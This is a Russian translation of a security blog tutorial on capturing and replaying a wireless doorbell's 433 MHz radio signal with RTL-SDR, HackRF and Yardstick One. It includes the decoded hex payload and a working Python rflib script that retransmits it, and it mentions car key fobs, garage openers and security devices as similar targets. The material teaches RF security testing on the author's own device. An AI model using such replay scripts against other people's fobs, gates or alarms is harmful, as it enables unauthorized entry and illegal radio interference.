---
description: 16/09/2020
---

# Hardware Hacking: Как воспроизводить радиосигналы с помощью SDR

_Перевела @ZzzNein_ _(безграничную благодарность можно выразить_ [_ЗДЕСЬ_](https://yasobe.ru/na/na\_perevody\_i\_kontent)_), проверила @N3M351DA._ [_Оригинальный текст_](https://www.blackhillsinfosec.com/how-to-replay-rf-signals-using-sdr/) _- Реймонд Фелч,_ 23 января 2020 г.

## **SDR: Способы воспроизведения радиосигнала**

![](<../../.gitbook/assets/image (232).png>)

**Внимание!** При передаче любых данных обязательно используйте клетку Фарадея или экранированную сумку, чтобы случайно не нарушить каких-либо законов несанкционированным вмешательством в эфир на определенных частотах. Кроме того, помните, что перехват и дешифрование/декодирование чужих данных является незаконным, поэтому будьте осторожны при исследовании вашего трафика.

### Вступление&#x20;

Недавно меня пригласили поработать с несколькими коллегами (большое спасибо ББ Кингу за то, что привел в свой проект) в рамках устранения неисправностей в лаборатории воспроизведения радиочастотных сигналов.

Хотя у меня в арсенале уже был дешевый RTL-SDR ($20) и более дорогой HackRF One ($350), в моей коллекции отсутствовал донгл Yardstick One ($100), который и использовали в лаборатории Кинга. Более того, программное обеспечение (RfCat) и уникальные скрипты для Yardstick One были ранее мне незнакомы.

Как можно догадаться, я немедленно заказал в местном магазине Yardstick One и в довесок - недорогой беспроводной дверной звонок ($12). Ожидая доставки, я решил взять HackRF One и попытаться перехватить радиосигнал пульта управления дверного звонка и воспроизвести его с помощью HackRF.

Понимая, что существует несколько способов осуществления атаки воспроизведения радиосигнала, я решил задокументировать свои выводы, чтобы другие могли извлечь выгоду из того, что я выяснил. Надеюсь, что, имея такую информацию, вы сможете выбирать способы в зависимости от ваших потребностей и финансов, сложности и универсальности доступных устройств и инструментов.

**USB-устройства SDR**:

·[RTL-SDR](https://www.rtl-sdr.com/buy-rtl-sdr-dvb-t-dongles/) – Недорогое устройство ($20), только прием сигнала (частотный диапазон: от 500 КГц до 1.75 ГГц).

·[Yardstick One](https://greatscottgadgets.com/yardstickone/) – Средний ценовой сегмент ($100), прием и передача сигнала (частотный диапазон: 300-348 МГц, 391-464 МГц и 782-928 МГц), полудуплекс.

·[HackRF One](https://greatscottgadgets.com/hackrf/) – Дорогое устройство ($350), прием и передача сигнала (частотный диапазон: 1 МГц и 6 ГГц), полудуплекс.

·[BladeRF](https://www.nuand.com/product/bladerf-x40/) – Верхний ценовой сегмент ($420), прием и передача (частотный диапазон: от 47 МГц до 6 ГГц, частота дискретизации: 61.44 МГц и множественная передача данных MIMO 2×2), полный дуплекс.

### **Примеры воспроизведения RF-сигнала с использованием беспроводного дверного звонка**:

Результаты FCC-поиска ([https://fccid.io/](https://fccid.io)) FCC ID устройства:

![](<../../.gitbook/assets/image (228).png>)

Частотный диапазон (МГц): 433.92 – 433.92

![](<../../.gitbook/assets/image (229).png>)

![](<../../.gitbook/assets/image (222).png>)

### **RTL-SDR** **– Прием и запись радиосигнала с использованием Gqrx.**

Примечание: RTL-SDR не может передавать сигнал!

![Данные смещены относительно необходимой частоты, скорректированная частота.](<../../.gitbook/assets/image (239).png>)

После корректировки необходимой для получения оптимального усиления и чистоты сигнала (433.89 МГц) можно нажать кнопку-переключатель “REC”, а затем кнопку дистанционного включения-выключения периферийных устройств и выполнить запись всплеска радиосигнала и сохранить его в файл.

![Кнопка «REC»](<../../.gitbook/assets/image (223).png>)

Очевидно, что мы не сможем передать такой сигнал ввиду ограничений RTL-SDR. Однако, такой файл можно воспроизвести с помощью Yardstick One или HackRF, если конвертировать его из .wav в raw. Например, для передачи данных с помощью HackRF необходим 8-битный подписанный необработанный (raw) IQ файл без информации о заголовке.

Помимо GQRX существует множество других приложений SDR GUI: SDRSharp, SIGINTOS и т.д.

### **HackRF** **One** **– Воспроизведение** **RF-сигналов с помощью командной строки**:

Без сомнений один из наиболее быстрых способов воспроизведения RF-сигнала, когда известна его средняя частота - применить инструмент HackRF под названием “_hackrf\_transfer_“.

Подставляя необходимые параметры, HackRF может захватывать необходимую передачу (по нажатию кнопки дистанционного включения-выключения периферийных устройств), а потом сохранять необработанные данные в файл. Кроме того, HackRF может воспроизводить (передавать) необработанный RF-сигнал из сохраненного файла и тем самым вызывать желаемую активность периферийных устройств без использования физического пульта дистанционного управления.

К сожалению, несмотря на быстроту и эффективность данного метода, он применяется «вслепую», поскольку о сигнале известно крайне мало. Такой способ позволяет выполнить поставленную задачу, но не помогает выявить возможные векторы атак или уязвимости.

![](<../../.gitbook/assets/image (230).png>)

### **HackRF One** **–** **Воспроизведение** **RF-сигналов с помощью** **схем GNURADIO**:

Хотя это и не самый быстрый способ воспроизведения RF-сигнала, HackRF можно использовать также в сочетании с схемами GNURADIO и посредством этого захватывать, сохранять и воспроизводить радиосигналы. Кривая обучения для понимания GNURADIO может быть довольно экстенсивной, тем не менее, за этой сложностью кроется мощь и универсальность данного инструмента.

На скриншотах ниже показан предыдущий проект воспроизведения сигнала (воспроизведение сигнала автомобильного брелка) с помощью схем GNURADIO. Как видно, средняя частота проекта составляет 315 Мгц, но сам процесс воспроизведения сигнала - тот же.

![](<../../.gitbook/assets/image (238).png>)

Показан блок File Sink, с помощью которого сохраняется захваченный сигнал.

![](<../../.gitbook/assets/image (236).png>)

Показана схема воспроизведения (блоки, отмеченные серым, отключены).

![](<../../.gitbook/assets/image (240).png>)

### **Yardstick One** **–** **Воспроизведение радиосигналов с помощью** **RfCat**:

Установите RFCat и необходимые зависимости (libusb, pyusb)

```
git clone https://github.com/atlas0fd00m/rfcat.git
cd rfcat/
sudo python setup.py install
cd ../
git clone https://github.com/walac/pyusb.git
cd pyusb/
sudo python setup.py install
easy install pip
pip install libusb
```

Подключите ваше устройство и выполните следующую команду для его верификации:

```
 rfcat -r 
```

Проверьте корректность установки и обнаружение донгла:

![](<../../.gitbook/assets/image (227).png>)

Загрузив сохраненный файл .wav (полученный с помощью GQRX) в Audacity мы может быстро идентифицировать переданный пакет данных с амплитудной модуляцией.

![](<../../.gitbook/assets/image (235).png>)

Выделив переданный пакет данных и изменив масштаб, можно проследить цикличность повторения более мелких пакетов.

![](<../../.gitbook/assets/image (234).png>)

Еще сильнее приблизив любой из повторяющихся более мелких пакетов, можно выявить модуляцию данных - это OOK («включение-выключение») PWM (широтно-импульсная модуляция). Учитываются как короткие (Маркер = 1), так и более широкие импульсы (Пробел = 0).

![](<../../.gitbook/assets/image (226).png>)

Декодируя импульсы волновой формы, получаем следующий цифровой сигнал:

![](<../../.gitbook/assets/image (231).png>)

#### **Бинарный поток двоичных сигналов**:

Чтобы повторно построить волновую форму для воспроизведения на Yardstick, каждое значение импульсов цифрового сигнал нужно закодировать с использованием следующей битовой таблицы:

`Значение сигнала = 0    Закодированные биты = 1110`

`Значение сигнала = 1    Закодированные биты = 1000`

#### **Закодированный битовый поток**:

`11101000 11101000 11101110 10001110 11101110 10001000 10001110 10001110 10001110 11101000 11101000 10001000 10000000`

Чтобы воспроизвести данный битовый поток используя Yardstick One, нужно конвертировать эти бинарные данные в шестнадцатеричный формат.

Результатом будут следующие значения:

`E8 E8 EE 8E EE 88 8E 8E 8E E8 E8 88 80`

Перед каждым таким значением в шестнадцатеричном формате нужно поставить ‘\x’.

Строка воспроизведения Yardstick =

`\xE8\xE8\xEE\x8E\xEE\x88\x8E\x8E\x8E\xE8\xE8\x88\x80`

Строка, дополненная нулями = `\xE8\xE8\xEE\x8E\xEE\x88\x8E\x8E\x8E\xE8\xE8\x88\x80\x00\x00\x00\x00\x00\x00`

Имея установленное программное обеспечение Yardstick One, мы теперь можем запустить RfCat:

```
$ sudo python doorbell.py
```

![Мой скрипт doorbell.py](<../../.gitbook/assets/image (221).png>)

**Примечание:** Скорость передачи данных примерно определяется с помощью уравнения: скорость передачи данных = обратная величина (1/t), где временем будет считаться интервал в 1 бит.

На скриншоте ниже показан 3-битовый импульс длиной примерно 630 микросекунд, деление на 3 дает время = 210 микросекунд на бит. Используя время самого короткого импульса (210 мкс) и взяв его обратную величину, получаем примерную скорость передачи данных = 4800 бит в секунду.

![](<../../.gitbook/assets/image (224).png>)

## **Дополнительная информация**

### **Использование RFCat** **в качестве анализатора спектра**

Установите зависимости анализатора спектра:

```
sudo pip install PySide2 
sudo apt-get install ipython 
```

Выполнить >d.specan(433920000) и нажать кнопку дистанционного управления

![](<../../.gitbook/assets/image (220).png>)

## **Заключение**

В попытке автоматизировать весь процесс воспроизведения (чтобы не вводить шестнадцатеричную строку вручную в диалоговом режиме), я написал короткий скрипт на python для воспроизведения цифрового сигнала, захваченного GQRX, который ранее анализировался в Audacity.

Как ранее упоминалось, кодирование цифрового сигнала основывалось исключительно на следующей битовой таблице:

`Значение сигнала = 0    Закодированные биты = 1110`

`Значение сигнала = 1    Закодированные биты = 1000`

Однако, следует отметить, что несмотря на то, что мне удалось успешно позвонить в звонок, у моего коллеги не получилось запустить тот же самый сценарий на его оборудовании. Ниже приводится разница между цифровыми сигналами, захваченными мной и им:

![Мой цифровой сигнал  и цифровой сигнал ББ Кинга](<../../.gitbook/assets/image (237).png>)

Обращаю ваше внимание, что мой сигнал начинается с «пробела» (кодирование 1110). Однако, сигнал Кинга начинается с «маркера», и взглянув на импульс, делаем вывод, что его следовало бы закодировать как 0001. К сожалению, я не рассчитывал на такое развитие событий, и мой скрипт кодировал его как 1000, что повлекло за собой неудачу Кинга при тестировании.

Я внес поправки в скрипт, и теперь он проверяет первый импульс цифрового сигнала и кодирует весь сигнал в соответствии со следующей битовой таблицей:

**Первый импульс сигнала = Пробел (‘0’)**

`Значение сигнала = 0    Закодированные биты = 1110`

`Значение сигнала = 1    Закодированные биты = 1000`

**Первый импульс сигнала = Маркер (‘1’)**

`Значение сигнала = 0    Закодированные биты = 0111`

`Значение сигнала = 1    Закодированные биты = 0001`

#### **Код на Python**:&#x20;

Прошу заметить, что не считаю свой код на python идеальным. Я набросал его довольно быстро исключительно в прикладных целях. Кроме того, поскольку в настоящее время модуль rflib на python3 не поддерживается, я писал код на python 2.7

Вы можете использовать и редактировать код по своему усмотрению, но помните, что несете ответственность за нарушение закона при несанкционированной передаче на законодательно регулируемых частотах.

```
import sys
import time
from rflib import *
from struct import *

# User defined parameters 
_digital_footprint = "0101001000111010100101111" # My footprint: (short transition from 'space to mark')
#_digital_footprint = "11000111010000" # BB King's footprint: (long transition from 'space to mark')
_frequency = 433890000
_baudrate = 4800
_modulation = "MOD_ASK_OOK"  # Modulation Type (not alterable in this version)
_mult = 3  # Number of times to transmit RF signal
_pad_bytes = 3 # Number of zero bytes for trailing padding
_method = "1" # Time period of 'valley' gap when transitioning from space to mark in footprint:
 # Short period (1 bit time period) : _method = "0"
 # Long period (3 bit time period)  : _method = "1"

# Configure rf_cat 
d = RfCat()

d.setFreq(_frequency)
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(_baudrate)

print "SIGNAL INFORMATION"
print "------------------"
print "Frequency:                 ", _frequency
print "Baud rate:                 ", _baudrate
print "ModulationType:            ", _modulation
print "Repeat transmission count: ", _mult
print "Digital footprint:         ", _digital_footprint

mark_space = str(_digital_footprint)
xmt_stream = ""

# Scan each digital footprint bit (pulse) and convert it to the appropriate 4-bit value
# Mark = 1 (short pulse) and Space = 0 (long pulse)
mark_space = str(_digital_footprint)
xmt_stream = ""

if (_method == "0"): # transitions from space to mark (in footprint) are short (1 bit time period)
 for i in mark_space:

 if (i == "0"): # Space
 _pulse = "1110"

 if (i == "1"): # Mark
 _pulse = "1000"

 xmt_stream = xmt_stream + _pulse

if (_method == "1"): # transitions from space to mark (in footprint) are long (3 bit time period)
 for i in mark_space:

 if (i == "0"): # Space
 _pulse = "0111"

 if (i == "1"): # Mark
 _pulse = "0001"

 xmt_stream = xmt_stream + _pulse

# If length of digital footprint is odd, then pad it with "0000" to make it 8 bits
if (len(_digital_footprint) % 2 != 0):
 xmt_stream = xmt_stream + "0000"

# Pad zeroes for gap length between transmissions
_padding = ""
for i in range(0, _pad_bytes):
 xmt_stream = xmt_stream + "00000000"
 _padding = _padding + "00000000"
print "Trailing padding:          ", _padding
 
print "RF transmit binary stream: ", xmt_stream

# Convert binary transmit stream to hex equivalent'
hex_xmt_stream = str(('%08X' % int(xmt_stream, 2)))
print "RF transmit hex stream:    ", hex_xmt_stream


mod_xmt_stream = ""
for i in xrange(0, len(hex_xmt_stream), 2):
 ch = "\\x"
 mod_xmt_stream = mod_xmt_stream + (ch + (hex_xmt_stream[i:i+2]))
print "Modified RF hex stream:    ", mod_xmt_stream

# -------------------Send Transmission ----------------------------------------#
print "Starting transmission ..."

hex_data = bytearray.fromhex(hex_xmt_stream)
d.RFxmit(hex_data, repeat = _mult)

d.setModeIDLE()
print " "
print "Transmission Complete"
```

## **Последующее тестирование**

В попытке понять, почему мне нужно иметь две отдельные битовые таблицы при кодировании для двух разных вариантов оборудования (всего лишь потому, что сигнал начинался с пробела или маркера в другом случае), я решил изучить сигнал подробнее. Используя известный рабочий цифровой сигнал, я запустил тестирование, но с кодированием Кинга, предполагая, что он может сработать и необходимость в двух битовых таблицах отпадет. Он не сработал, и я углубился в изучение причин. После внимательного рассмотрения стало ясно, где кроется проблема. Дело было не в том, что мой сигнал начинался с пробела, а его с маркера, различие крылось во времени перехода от пробела к маркеру!

Сравните два цифровых сигнала (которые уже приводились ранее):

![Мой цифровой сигнал и цифровой сигнал ББ Кинга](<../../.gitbook/assets/image (233).png>)

Проанализировав свой сигнал, я установил, что время перехода от пробела к маркеру составляет 1 бит, в то время как такой же интервал у Кинга равнялся 3 битам.

Основываясь на этих знаниях, я снова изменил свой код, чтобы учесть эту разницу при выборе битовой таблицы. Больше не заботясь о том, с чего начинается сигнал, я вместо этого обратил внимание на интервал перехода и использовал эту информацию для выбора подходящей битовой таблицы. _**Успех!!!**_

## **Заключение и выводы**

Работая с Yardstick впервые, могу сказать, что это был очень полезный опыт. Иметь возможность посотрудничать с ББ Кингом (BB King), одновременно разрабатывая собственное уникальное оборудование, и подавно неоценимая возможность. Это помогло мне сосредоточиться, двигаться в правильном направлении и давало высокую мотивацию, а также позволило столкнуться с различными обстоятельствами, которые могут возникать при тестировании.

Кроме того, по моему скромному мнению Yardstick One [Майкла](https://twitter.com/michaelossmann) Османа (Great Scott Gadgets) – великолепный инструмент: довольно недорогой, простой в обращении, но разнообразный в применении и подходящий для автоматизации процесса, если в том возникнет необходимость. При захвате и воспроизведении сигналов устройств с подвижным или фиксированным кодом (автомобильные брелоки, системы дистанционного открытия гаражных ворот, беспроводные дверные звонки, устройства безопасности или практически любых беспроводных радиосигналов в этом диапазоне частот) частотные ограничения (до 1 ГГц) Yardstick One не играют большой роли.
